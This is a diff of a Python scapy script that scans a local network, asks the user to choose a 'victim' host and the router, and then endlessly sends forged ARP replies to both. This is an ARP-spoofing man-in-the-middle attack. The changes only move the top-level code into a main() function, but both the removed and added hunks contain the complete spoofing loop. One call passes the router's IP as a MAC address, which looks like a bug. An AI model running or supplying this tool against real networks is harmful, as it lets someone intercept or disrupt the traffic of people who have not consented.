@@ -35,6 +35,7 @@ def login():
     os.chdir("/sys/class/net")
     interface_names = os.listdir()
     print(interface_names)
+    global discovering
     discovering = input("on which interface would you like to discover network ? (1, 2, 3)...")
     ip = ni.ifaddresses(interface_names[int(discovering)-1])[ni.AF_INET][0]['addr']
     ip1, ip2, ip3, _ = ip.split(".")
@@ -58,7 +59,7 @@ def scan(target):
         animation_symbol = "|/-\\|/-"
         while not done:
             print("Scanning...",animation_symbol[where], end="\r")
-            time.sleep(0.1)
+            time.sleep(0.1) 
             where += 1
             if where == len(animation_symbol):
                 where = 0
@@ -118,30 +119,33 @@ def checkIP(ipCheck):
         result = False
     return result
 
-victim, router = 0, 0
-checkSystem()
-graphBar()
-target = login()
-ip, mac = scan(target)
-victim, router = isGoodNetwork(target, ip, mac)
-
-verboseShow = input("Would you like to see verbose? (shows every packet send.) y/n\n")
-if verboseShow == "y":
-    verboseShow = True
-else:
-    verboseShow = False
-print("Start sending packets.")
-
 def handler(signum, frame):
     res = input("Ctrl-c was pressed. Do you really want to exit? y/n\n")
     if res == "y":
         print("farewell")
         exit(1)
 
-signal.signal(signal.SIGINT, handler)
+def main():
+    victim, router = 0, 0
+    checkSystem()
+    graphBar()
+    target = login()
+    ip, mac = scan(target)
+    victim, router = isGoodNetwork(target, ip, mac)
 
-while True: 
-    arp_response = ARP(pdst=ip[int(victim)-1], hwdst=mac[int(victim)-1], psrc=router)
-    scap.send(arp_response, count = 1, verbose=verboseShow)
-    arp_response = ARP(pdst=router, hwdst=router, psrc=ip[int(victim)-1])
-    scap.send(arp_response, count = 1, verbose=verboseShow) 
+    verboseShow = input("Would you like to see verbose? (shows every packet send.) y/n\n")
+    if verboseShow == "y":
+        verboseShow = True
+    else:
+        verboseShow = False
+    print("Start sending packets.")
+    signal.signal(signal.SIGINT, handler)
+
+    while True: 
+        arp_response = ARP(pdst=ip[int(victim)-1], hwdst=mac[int(victim)-1], psrc=router)
+        scap.send(arp_response, count = 1, verbose=verboseShow)
+        arp_response = ARP(pdst=router, hwdst=router, psrc=ip[int(victim)-1])
+        scap.send(arp_response, count = 1, verbose=verboseShow) 
+
+if __name__ == '__main__':
+    main()
